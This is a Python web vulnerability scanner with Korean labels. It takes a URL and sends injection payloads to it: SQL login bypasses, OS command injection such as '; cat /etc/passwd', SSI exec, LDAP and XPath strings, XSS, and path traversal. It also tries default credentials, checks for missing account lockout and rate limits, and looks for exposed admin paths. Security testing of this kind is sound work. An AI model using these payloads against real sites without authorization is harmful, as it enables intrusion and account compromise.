import requests
import urllib.parse
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
import time

class WebVulnScanner:
  def __init__(self, target_url):
    self.target_url = target_url
    self.session = requests.Session()
    self.session.headers.update({
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    })
    self.results = []
    self.login_urls = []
    self.search_forms = []
    self.login_form_fields = {}
    
  def log_result(self, vuln_name, status, details=""):
    result = {
      'vulnerability': vuln_name,
      'status': '취약' if status else '양호',
      'details': details,
    }
    self.results.append(result)
    print(f"[{result['status']}] {vuln_name}: {details}")
    
  def find_forms(self):
    try:
      response = self.session.get(self.target_url, timeout=10)
      soup = BeautifulSoup(response.content, 'html.parser')
      
      login_links = []
      for a in soup.find_all('a', href=True):
        href = a.get('href', '').lower()
        text = a.get_text().lower()
        if any(k in href + text for k in ['login', 'signin', 'sign-in', 'sign up', 'register']):
          full_url = urljoin(self.target_url, a['href'])
          if full_url not in login_links:
            login_links.append(full_url)
          
      self.login_urls = login_links
      
      # 검색 폼 찾기
      search_forms = []
      for form in soup.find_all('form'):
        text_input = form.find('input', {'type': ['text', 'search']}) or form.find('input', {'name': re.compile(r'(search|query|q)', re.I)})
        get_submit = form.find('input', {'type': ['submit', 'button']}) or form.find('button')
        
        if text_input and get_submit:
          action = form.get('action', '')
          if action:
            form_url = urljoin(self.target_url, action)
          else:
            form_url = self.target_url
          
          if form_url not in search_forms:
            search_forms.append(form_url)
          
      self.search_forms = search_forms
      
      default_login_path = ['/login', '/signin', '/sign-in', '/admin', '/signup']
      for path in default_login_path:
        full_url = self.target_url.rstrip('/') + path
        if full_url not in self.login_urls:
          try:
            test_response = self.session.get(full_url, timeout=5)
            if test_response.status_code == 200:
              test_soup = BeautifulSoup(test_response.content, 'html.parser')
              if test_soup.find('form') and (test_soup.find('input', {'type':'password'}) or any(keyword in test_response.text.lower() for keyword in ['password', 'login'])):
                self.login_urls.append(full_url)
          except:
            pass
          
      # 로그인 폼 필드 분석
      for login_url in self.login_urls:
        try:
          login_response = self.session.get(login_url, timeout=5)
          if login_response.status_code != 200:
            continue
          login_soup = BeautifulSoup(login_response.content, 'html.parser')
          
          login_forms = login_soup.find_all('form')
          target_form = None
          
          for form in login_forms:
            if form.find('input', {'type': 'password'}):
              target_form = form
              break
          
          if not target_form and login_forms:
            target_form = login_forms[0]
          
          if target_form:
            fields = {}
            username_field = None
            password_field = None
            
            for input_tag in target_form.find_all('input'):
              name = input_tag.get('name', '')
              if not name:
                continue
              
              input_type = input_tag.get('type', 'text')
              input_id = input_tag.get('id', '').lower()
              placeholder = input_tag.get('placeholder', '').lower()
              
              # username 필드 찾기
              if (input_type in ['text', 'email'] and 
                  (any(keyword in name.lower() for keyword in ['user', 'id', 'email', 'name', 'login']) or
                  any(keyword in input_id for keyword in ['user', 'id','email', 'name', 'login']) or
                  any(keyword in placeholder for keyword in ['user', 'id', 'email', 'name', 'login']))):
                username_field = name
              elif (input_type == 'password' or 
                    any(keyword in name.lower() for keyword in ['pass', 'pwd']) or
                    any(keyword in input_id for keyword in ['pass', 'pwd']) or
                    any(keyword in placeholder for keyword in ['pass', 'pwd'])):
                password_field = name
              elif input_type == 'hidden':
                fields[name] = input_tag.get('value', '')
                
            action = target_form.get('action', '')
            method = target_form.get('method', 'post').lower()
            form_action_url = urljoin(login_url, action) if action else login_url
            
            if username_field:
              fields['username'] = username_field
            if password_field:
              fields['password'] = password_field
            
            fields['form_action'] = form_action_url
            fields['form_method'] = method
            
            if username_field or password_field:
              self.login_form_fields[login_url] = fields
        except Exception as e:
          continue
    
    except Exception as e:
      print(f"폼 검색 중 오류 {e}")
    
    print(f"로그인 URL: {self.login_urls}")
    print(f"검색 폼 URL: {self.search_forms}")
    print(f"로그인 폼 필드: {self.login_form_fields}")
    
  def buffer_overflow(self):
    long_str = 'A' * 5000
    test_cases = [
      f"{self.target_url}?test={long_str}",
      f"{self.target_url}/search?query={long_str}",
    ]
    
    for login_url in self.login_urls:
      try:
        if login_url in self.login_form_fields:
          fields = self.login_form_fields[login_url]
          form_action = fields.get('form_action', login_url)
          method = fields.get('method', 'post')
          
          username_field = fields.get('username', 'username')
          password_field = fields.get('password', 'password')
          
          data = {}
          data[username_field] = long_str
          data[password_field] = long_str
          
          if method == 'post':
            response = self.session.post(form_action, data=data, timeout=10)
          else:
            response = self.session.get(form_action, params=data, timeout=10)
        else:
          data = {'username': long_str, 'password': long_str}
          response = self.session.post(login_url, data=data, timeout=10)
      except:
        continue
    
    for search_url in self.search_forms:
      try:
        data = {'q': long_str,'query': long_str, 'search': long_str}
        response = self.session.post(search_url, data=data, timeout=10)
      except:
        continue
    
    vulnerable = False
    for url in test_cases:
      try:
        response = self.session.get(url, timeout=10)
        if any(error in response.text.lower() for error in ['error', 'exception', 'buffer overflow', 'segmentation fault']):
          vulnerable = True
          break
      except:
        continue
    
    self.log_result("버퍼 오버플로우", vulnerable, "대량 문자열 입력 시 에러 발생" if vulnerable else "정상 작동")
    
  def format_string(self):
    patterns = [
      "%n%n%n%n%n%n%n%n%n%n",
      "%s%s%s%s%s%s%s%s%s%s",
      "%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n!",
      "%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s!"
    ]
    
    vulnerable = False
    for pattern in patterns:
      try:
        url = f"{self.target_url}?test={urllib.parse.quote(pattern)}"
        response = self.session.get(url, timeout=10)
        if response.status_code >= 500:
          vulnerable = True
          break
      except:
        continue
    
    self.log_result("포맷 스트링", vulnerable, "에러 발생" if vulnerable else "정상 작동")
    
  def ldap_injection(self):
    ldap_payloads = [
      "*",
      "admin)(&))",
      "*)(&",
      ")(cn=*))",
      "*()|&'",
      "*(|(objectclass=*))",
      "*)(uid=*))(|(uid=*",
      "admin*)((|userpassword=*)"    
    ]
    
    vulnerable = False
    
    for login_url in self.login_urls:
      for payload in ldap_payloads:
        try:
          if login_url in self.login_form_fields:
            fields = self.login_form_fields[login_url]
            form_action = fields.get('form_action', login_url)
            method = fields.get('method', 'post')
            username_field = fields.get('username', 'username')
            password_field = fields.get('password', 'password')
            
            data = {}
            data[username_field] = payload
            data[password_field] = payload
            
            if method == 'post':
              response = self.session.post(form_action, data=data, timeout=10)
            else:
              response = self.session.get(form_action, params=data, timeout=10)
          else:
            data = {'username': payload, 'password': payload}
            response = self.session.post(login_url, data=data, timeout=10)
          
          if response.status_code >= 500 or any(error in response.text.lower() for error in ['ldap', 'directory', 'error', 'exception', 'invalid']):
            vulnerable = True
            break
        except:
          continue
        if vulnerable:
          break
    
    self.log_result("LDAP 인젝션", vulnerable, "에러 발생" if vulnerable else "정상 작동")
    
  def os_command_injection(self):
    os_payloads = [
      '; ls -la',
      '| dir',
      '& whoami',
      '; cat /etc/passwd',
      '`id`',
      '$(whoami)'
    ]
    
    vulnerable = False
    for payload in os_payloads:
      try:
        url = f"{self.target_url}?cmd={urllib.parse.quote(payload)}"
        response = self.session.get(url, timeout=10)
        
        if any(pattern in response.text for pattern in ['root:', 'uid=', 'gid=', 'Volume in drive', 'Directory of']):
          vulnerable = True
          break
      except:
        continue
    
    self.log_result("OS 명령어 인젝션", vulnerable, "OS 명령어 인젝션 취약" if vulnerable else "OS 명령어 인젝션 정상")
    
  def sql_injection(self):
      sql_payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "admin'--",
        "' AND 1=2 UNION SELECT 1,version()--"
      ]
      vulnerable = False
      details = ""
      
      if self.login_urls:
        for login_url in self.login_urls:
          try:
            for payload in sql_payloads:
              try:
                if login_url in self.login_form_fields:
                  fields = self.login_form_fields[login_url]
                  form_action = fields.get('form_action', login_url)
                  method = fields.get('form_method', 'post')
                  username_field = fields.get('username', 'username')
                  password_field = fields.get('password', 'password')
                  
                  data = {}
                  for key, value in fields.items():
                    if key not in ['username', 'password', 'form_action', 'form_method']:
                      data[key] = value
                      
                  data[username_field] = payload
                  data[password_field] = payload
                  
                  if method == 'post':
                    response = self.session.post(form_action, data=data, timeout=10, allow_redirects=True)
                  else:
                    response = self.session.get(form_action, params=data, timeout=10, allow_redirects=True)
                else:
                  data = {'username': payload, 'password': payload}
                  response = self.session.post(login_url, data=data, timeout=10, allow_redirects=True)
                
                success_message = ['welcome', 'dashboard', 'logout', 'user info', 'profile', 'admin', 'success', '성공', '환영', '로그아웃']
                failure_message = ['login failed', 'invalid', 'incorrect', 'error', '로그인 실패', '잘못된', '오류', 'failed']
                
                response_text = response.text.lower()
                login_success = any(message in response_text for message in success_message)
                login_failure = any(message in response_text for message in failure_message)
                
                if response.status_code in [301, 302, 303, 307, 308]:
                  vulnerable = True
                  details = f"SQL 인젝션으로 로그인 성공"
                  break
                
                if login_success and not login_failure:
                  vulnerable = True
                  details = f"SQL 인젝션으로 로그인 성공"
                  break
                
              except Exception as e:
                print(f"SQL 인젝션 검사 중 오류: {e}")
                continue
            if vulnerable:
              break
          except:
            continue
          if vulnerable:
            break
      
      if not details and not vulnerable:
        details = "SQL 인젝션 취약점 없음"
      
      self.log_result("SQL 인젝션", vulnerable, details)
    
  def ssi_injection(self):
    ssi_payloads = [
      '<!--#echo var="DOCUMENT_ROOT" -->',
      '<!--#exec cmd="ls -al" -->',
      '<!--#include virtual="/etc/passwd" -->'
    ]
    vulnerable = False
    details = ""
    ssi_messages = ['/var/www', '/usr', 'root:', 'drwx', 'total ']
    
    for payload in ssi_payloads:
      try:
        url = f"{self.target_url}?page={urllib.parse.quote(payload)}"
        response = self.session.get(url, timeout=10)
        
        if any(message in response.text for message in ssi_messages):
          vulnerable = True
          details = "SSI 취약점 발견"
          break
      except Exception as e:
        continue
    
    if not vulnerable and self.search_forms:
      for form_url in self.search_forms:
        for payload in ssi_payloads:
          try:
            url = f"{form_url}?query={urllib.parse.quote(payload)}"
            response = self.session.get(url, timeout=10)
            
            if any(message in response.text for message in ssi_messages):
              vulnerable = True
              details = "SSI 취약점 발견(검색폼)"
              break
            
            # POST 요청으로 검사
            data = {'q': payload, 'search': payload, 'query': payload}
            response = self.session.post(form_url, data=data, timeout=10)
            
            if any(message in response.text for message in ssi_messages):
              vulnerable = True
              details = "SSI 취약점 발견(검색폼 POST)"
              break
          except Exception as e:
            continue
        if vulnerable:
          break
    
    if not details:
      details = "SSI 명령어 차단"
    
    self.log_result("SSI 인젝션", vulnerable, details)
    
  def xpath_injection(self):
    vulnerable = False
    details = ""
    
    if not self.login_urls:
      details = "로그인 페이지 없음"
      self.log_result("XPath 인젝션", vulnerable, details)
      return
    
    step1_vul = False
    
    for login_url in self.login_urls:
      if login_url in self.login_form_fields:
        fields = self.login_form_fields[login_url]
        username_field = fields.get('username', 'username')
        password_field = fields.get('password', 'password')
        
        true_payload = "' and 'a'='a"
        false_payload = "' and 'a'='b"
        
        try:
          true_url = f"{login_url}?{username_field}={urllib.parse.quote(true_payload)}"
          false_url = f"{login_url}?{username_field}={urllib.parse.quote(false_payload)}"
          
          true_resp = self.session.get(true_url, timeout=10)
          false_resp = self.session.get(false_url, timeout=10)
          
          if (len(true_resp.text) != len(false_resp.text) or
              true_resp.status_code != false_resp.status_code):
            step1_vul = True
            break
        except:
          continue
    
    step2_payloads = [
      "' or count(parent::*[position()=1])=0 or 'a'='b",
      "' or count(parent::*[position()=1])>0 or 'a'='b",
      "1 or count(parent::*[position()=1])=0",
      "1 or count(parent::*[position()=1])>0"    
    ]
    step2_vul = False
    
    if not step1_vul:
      for login_url in self.login_urls:
        if login_url in self.login_form_fields:
          fields = self.login_form_fields[login_url]
          username_field = fields.get('username', 'username')
          
          for payload in step2_payloads:
            try:
              url = f"{login_url}?{username_field}={urllib.parse.quote(payload)}"
              response = self.session.get(url, timeout=10)
              
              error_keywords = ['xpath', 'xml', 'parse', 'syntax error', 'malformed', 'invalid', 'exception', 'error']
              error_messages = any(keyword in response.text.lower() for keyword in error_keywords)
              if not error_messages and response.status_code == 200:
                step2_vul = True
                break
            except Exception as e:
              continue
          if step2_vul:
            break
    
    vulnerable = step1_vul or step2_vul
    if vulnerable:
      detail_part = []
      if step1_vul:
        detail_part.append("참/거짓 조건 응답 차이")
      if step2_vul:
        detail_part.append("XPath 쿼리 응답 차이")
      details = "XPath 쿼리 변조 가능 (" + ", ".join(detail_part) + ")"
    else:
      details = "XPath 인젝션 취약점 없음"
    
    self.log_result("XPath 인젝션", vulnerable, details)

  def directory_indexing(self):
    test_dirs = ['/admin/', '/backup/', '/uploads/', '/files/', '/images/']
    vulnerable = False
    
    for directory in test_dirs:
      try:
        url = self.target_url + directory
        response = self.session.get(url, timeout=10)
        
        if any(keyword in response.text.lower() for keyword in ['index of', 'parent directory', 'last modified', 'size', 'name']):
          vulnerable = True
          break
      except:
        continue
      
      try:
        url_with_slash = self.target_url.rstrip('/') + directory.rstrip('/') + '%3f.jsp'
        response = self.session.get(url_with_slash, timeout=10)
        
        if response.status_code == 200 and any(keyword in response.text.lower() for keyword in ['index of', 'parent directory', 'last modified', 'size']):
          vulnerable = True
          break
      except:
        continue
    self.log_result("디렉토리 인덱싱", vulnerable, "디렉토리 인덱싱 가능" if vulnerable else "디렉토리 인덱싱 불가")

  def xss(self):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>"
    ]
    vulnerable = False
    
    for payload in payloads:
      try:
        url = f"{self.target_url}?search={urllib.parse.quote(payload)}"
        response = self.session.get(url, timeout=10)
        if payload in response.text:
          vulnerable = True
          break
      except:
        continue
    
    if not vulnerable and self.search_forms:
      for form_url in self.search_forms:
        try:
          form_response = self.session.get(form_url, timeout=10)
          form_soup = BeautifulSoup(form_response.content, 'html.parser')
          
          for form in form_soup.find_all('form'):
            text_inputs =form.find_all('input', {'type': ['text', 'search']})
            if not text_inputs:
              text_inputs = form.find_all('input', {'name': re.compile(r'(search|query|q)', re.I)})
              
            if not text_inputs:
              continue
            
            action = form.get('action', '')
            submit_url = urljoin(form_url, action) if action else form_url
            method = form.get('method', 'get').lower()
            
            for payload in payloads:
              form_data = {}
              
              for input_tag in form.find_all('input'):
                name = input_tag.get('name')
                if name:
                  input_type = input_tag.get('type', 'text')
                  if input_type in ['text', 'search'] or name.lower() in ['search', 'query', 'q']:
                    form_data[name] = payload
                  elif input_type == 'hidden':
                    form_data[name] = input_tag.get('value', '')
            if method == 'post':
              response = self.session.post(submit_url, data=form_data, timeout=10)
            else:
              response = self.session.get(submit_url, params=form_data, timeout=10)
              
            if payload in response.text:
              vulnerable = True
              break
        except:
          continue
        if vulnerable:
          break
        
    self.log_result("XSS", vulnerable, "XSS 취약점 발견" if vulnerable else "XSS 취약점 없음")
            
    

  def weak_auth(self):
    login_url = self.login_urls[0] 
    vulnerable = False

    weak_credentials = [
        ('admin', 'admin'), ('admin', 'password'), ('admin', '1234'), ('admin', ''),
        ('administrator', 'administrator'), ('manager', 'manager'), 
        ('guest', 'guest'), ('test', 'test'), ('scott', 'scott'),
        ('tomcat', 'tomcat'), ('root', 'root'), ('user', 'user'),
        ('operator', 'operator'), ('anonymous', 'anonymous')
      ]
    
    try:
      response = self.session.get(login_url, timeout=10)
      if response.status_code == 200:
        for username, password in weak_credentials:
          if login_url in self.login_form_fields:
            form_fields = self.login_form_fields[login_url].copy()
            username_field = form_fields.get('username', 'username')
            password_field = form_fields.get('password', 'password')
            form_action_url = form_fields.get('form_action', login_url)

            login_data = {k: v for k, v in form_fields.items() if k not in ['username', 'password', 'form_action', 'form_method']}
            login_data[username_field] = username
            login_data[password_field] = password
          else:
            login_data = {'username': username, 'password': password}
            target_url = login_url

          login_response = self.session.post(login_url, data=login_data, timeout=10)
          
          if (login_response.status_code == 200 and 
              any(keyword in login_response.text.lower() for keyword in ['welcome', 'dashboard', 'logout', 'admin panel', 'profile', 'settings'])):
            vulnerable = True
            break
    except:
      pass
    if not vulnerable:
      try:
        response = self.session.get(login_url, timeout=10)
        if response.status_code == 200:
          if login_url in self.login_form_fields:
            form_fields = self.login_form_fields[login_url].copy()
            username_field = form_fields.get('username', 'username')
            password_field = form_fields.get('password', 'password')
            form_action_url = form_fields.get('form_action', login_url)

            base_login_data = {k:v for k, v in form_fields.items() if k not in ['username', 'password', 'form_action', 'form_method']}
            target_url = form_action_url
          else:
            username_field = 'username'
            password_field = 'password'
            base_login_data = {}
            target_url = login_url

          for i in range(5):
            login_data = base_login_data.copy()
            login_data[username_field] = 'testuser'
            login_data[password_field] = 'wrongpassword'
            
            login_response = self.session.post(target_url, data=login_data, timeout=10)
          
          login_data = base_login_data.copy()
          login_data[username_field] = 'testuser'
          login_data[password_field] = 'wrongpassword'

          id_lock = self.session.post(target_url, data=login_data, timeout=10)

          if not any(keyword in id_lock.text.lower() for keyword in ['locked', 'blocked', 'suspended', 'too many']):
            vulnerable = True
          
      except Exception as e:
        print(f"약한 인증 검사 중 오류: {e}")
    
    self.log_result("약한 인증", vulnerable, "약한 인증 또는 계정 잠금 없음" if vulnerable else "강한 인증 및 계정 잠금 적용됨")

  def session_prediction(self):
    session_ids = []
    vulnerable = False
    
    for i in range(5):
      try:
        response = self.session.get(self.target_url, timeout=10)
        if 'Set-Cookie' in response.headers:
          cookies = response.headers['Set-Cookie']
          session_match = re.search(r'JSESSIONID=([^;]+)|PHPSESSID=([^;]+)|ASP\.NET_SessionId=([^;]+)', cookies)
          if session_match:
            session_id = session_match.group(1) or session_match.group(2) or session_match.group(3)
            session_ids.append(session_id)
            
            time.sleep(1)
      except:
        continue
    if len(session_ids) >= 2:
      number_parts = []
      for sid in session_ids:
        numbers = re.findall(r'\d+', sid)
        if numbers:
          number_parts.extend([int(n) for n in numbers])
      
      if len(number_parts) >= 2:
        diffs = [abs(number_parts[i] - number_parts[i-1]) for i in range(1, len(number_parts))]

        if all(diff <= 100 for diff in diffs):
          vulnerable = True
          details = "세션 ID 예측 가능"
          
    self.log_result("세션 예측", vulnerable, details if vulnerable else "세션 ID 예측 불가")
    
  def auto_attack(self):
    vulnerable = False
    
    try:
      block_keywords = [
        'captcha', 'rate limit', 'too many', 'blocked', 
        'suspicious', 'temporarily', 'verification'
      ]
      login_data = {'username': 'test', 'password': 'test'}
      
      for i in range(5):
        if self.login_urls:
          login_url = self.login_urls[0]
          if login_url in self.login_form_fields:
            form_fields = self.login_form_fields[login_url].copy()
            username_field = form_fields.get('username', 'username')
            password_field = form_fields.get('password', 'password')
            
            login_data = form_fields.copy()
            login_data[username_field] = 'test'
            login_data[password_field] = 'test'
          else:
            login_data = {'username' : 'test', 'password': 'test'}
          response = self.session.post(self.target_url, data=login_data, timeout=10)
        else:
          response = self.session.post(self.target_url, data={'username':'test', 'password':'test'}, timeout=10)
          
        if response.status_code not in [429, 403, 401] and \
          not any(keyword in response.text.lower() for keyword in block_keywords):
          if i >= 2:
            vulnerable = True
            break
          
      if not vulnerable:
        post_data = {'title': 'test', 'content': 'test'}
        for i in range(5):
          response = self.session.post(self.target_url, data=post_data, timeout=10)
          if response.status_code not in [429, 403, 401] and \
            not any(keyword in response.text.lower() for keyword in block_keywords):
            if i >= 2:
              vulnerable = True
              break
            
      if not vulnerable:
        for i in range(10):
          response = self.session.get(f"{self.target_url}?req={i}", timeout=10)
          if response.status_code not in [429, 503] and \
            not any(keyword in response.text.lower() for keyword in block_keywords):
            if i >= 7:
              vulnerable = True
              break
    except:
      pass
    
    self.log_result("자동화 공격", vulnerable, "반복 요청 통제 취약" if vulnerable else "반복 요청 통제됨")
      
  def admin_page_exposure(self):
    admin_paths = [
      '/admin', '/administrator', '/manager', '/master', '/system'
    ]
    vulnerable = False
    exposed_pages = []
    
    for path in admin_paths:
      try:
        url = self.target_url + path
        response = self.session.get(url, timeout=10)
        
        if response.status_code == 200:
          admin_keywords = ['admin', 'administrator', 'management', 'control panel', 'dashboard']
          if any(keyword in response.text.lower() for keyword in admin_keywords):
            vulnerable = True
            exposed_pages.append(path)
      except:
        continue
      
      details = f"노출된 관리자 페이지: {', '.join(exposed_pages)}" if exposed_pages else "관리자 페이지 노출 없음"
    self.log_result("관리자 페이지 노출", vulnerable, details if vulnerable else "관리자 페이지 노출 없음")
  
  def path_route(self):
    traversal_payloads = [
      '../../../../../../../../../../../../etc/passwd',
      '../../../../../../../../../../../../winnt/win.ini',
      '../../../../../../../../../../../../boot.ini',
    ]
    
    vulnerable = False
    for payload in traversal_payloads:
      try:
        url = f"{self.target_url}?file={urllib.parse.quote(payload)}"
        response = self.session.get(url, timeout=10)
        
        if any(pattern in response.text for pattern in ['root:', 'bin:', '[fonts]']):
          vulnerable = True
          break
      except:
        continue
    self.log_result("경로 탐색", vulnerable, "경로 탐색 취약점 발견" if vulnerable else "경로 탐색 취약점 없음")
  
if __name__ == "__main__":
  target_url = input("URL 입력 : ")
  scanner = WebVulnScanner(target_url)
  
  scanner.find_forms()
  scanner.buffer_overflow()
  scanner.format_string()
  scanner.ldap_injection()
  scanner.os_command_injection()
  scanner.sql_injection()
  scanner.ssi_injection()
  scanner.xpath_injection()
  scanner.directory_indexing()
  scanner.xss()
  scanner.weak_auth()
  scanner.session_prediction()
  scanner.auto_attack()
  scanner.admin_page_exposure()
  scanner.path_route()
  
  
  print("\n=== 취약점 스캔 결과 ===")
  # 취약점만 출력
  for result in scanner.results:
    if result['status'] == '취약':
      print(f"{result['vulnerability']}: {result['details']}")
  print("\n=== 스캔 완료 ===")